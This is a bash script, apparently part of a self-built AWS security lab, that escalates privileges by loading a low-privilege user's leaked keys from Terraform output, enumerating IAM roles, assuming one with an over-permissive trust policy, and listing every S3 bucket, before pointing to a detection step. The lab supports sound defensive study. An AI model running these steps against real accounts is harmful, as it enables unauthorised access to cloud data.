#!/usr/bin/env bash
# Scenario 02 — IAM Privilege Escalation :: ATTACK
#
# Escalates from a low-privilege IAM user to a broader-access role using
# ONLY the low-priv user's own credentials — no root/admin access anywhere.
# The escalation is possible purely because the target role's trust policy
# is too permissive (it trusts the account root ARN = any principal in the
# account).
#
# Reads everything from `terraform output` — nothing hardcoded. The
# analyst's secret key is read via `-raw` into shell variables only; it is
# never written to a file or printed. Treat it like a real leaked key.
set -euo pipefail

TF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../terraform" && pwd)"

# Load the analyst's leaked credentials and tell the AWS CLI to use them
# for every command from here on (until we overwrite them in step 4).
# `export` = "use these credentials for the rest of this script." Because
# this runs in its own shell, it does NOT change your normal `aws` login.
export AWS_ACCESS_KEY_ID="$(terraform -chdir="$TF_DIR" output -raw analyst_access_key_id)"
export AWS_SECRET_ACCESS_KEY="$(terraform -chdir="$TF_DIR" output -raw analyst_secret_access_key)"
unset AWS_SESSION_TOKEN 2>/dev/null || true

echo "[*] Attack start (UTC): $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo

echo "=== STEP 1: who are we? (prove we start as the low-priv analyst) ==="
aws sts get-caller-identity

echo
echo "=== STEP 2: RECON — enumerate roles and find one worth attacking ==="
# The analyst has IAM read access, so it can list every role in the
# account and read trust policies — this is how a real attacker discovers
# the target instead of being told about it.
TARGET_ARN="$(aws iam list-roles --query "Roles[?contains(RoleName, 'broad-read')].Arn | [0]" --output text)"
TARGET_NAME="$(basename "$TARGET_ARN")"
echo "[+] Found candidate role: $TARGET_ARN"
echo "[+] Its trust policy (note it trusts ...:root = anyone in this account):"
aws iam get-role --role-name "$TARGET_NAME" --query 'Role.AssumeRolePolicyDocument' --output json

echo
echo "=== STEP 3: BEFORE — prove the analyst has almost no data access ==="
echo "    (expect AccessDenied — the analyst can enumerate IAM but not read S3)"
aws s3api list-buckets 2>&1 | head -3 || true

echo
echo "=== STEP 4: ESCALATE — assume the role using only the analyst's creds ==="
ASSUMED_JSON="$(aws sts assume-role --role-arn "$TARGET_ARN" --role-session-name privesc-poc --output json)"
echo "[!] AssumeRole succeeded — the trust policy let us in."
# Overwrite our identity with the assumed role's TEMPORARY credentials.
export AWS_ACCESS_KEY_ID="$(echo "$ASSUMED_JSON" | jq -r '.Credentials.AccessKeyId')"
export AWS_SECRET_ACCESS_KEY="$(echo "$ASSUMED_JSON" | jq -r '.Credentials.SecretAccessKey')"
export AWS_SESSION_TOKEN="$(echo "$ASSUMED_JSON" | jq -r '.Credentials.SessionToken')"

echo
echo "=== STEP 5: AFTER — prove the escalation is real ==="
echo "[+] We are now the assumed role:"
aws sts get-caller-identity
echo "[+] And we can now list every bucket in the account (denied in step 3):"
aws s3api list-buckets --query 'Buckets[].Name' --output table

echo
echo "[*] Attack complete. CloudTrail delivery lags ~5-15 min — run"
echo "    scripts/detect.sh after that window."
